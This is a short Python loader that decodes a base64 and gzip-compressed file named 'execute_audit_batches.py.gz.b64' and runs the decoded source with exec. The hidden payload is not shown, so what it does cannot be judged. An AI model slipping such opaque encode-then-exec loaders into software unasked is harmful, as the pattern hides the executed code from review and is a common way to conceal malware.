from pathlib import Path
import base64
import gzip

payload = Path(__file__).with_name("execute_audit_batches.py.gz.b64")
source = gzip.decompress(base64.b64decode(payload.read_text(encoding="utf-8").strip()))
exec(compile(source, str(payload), "exec"))
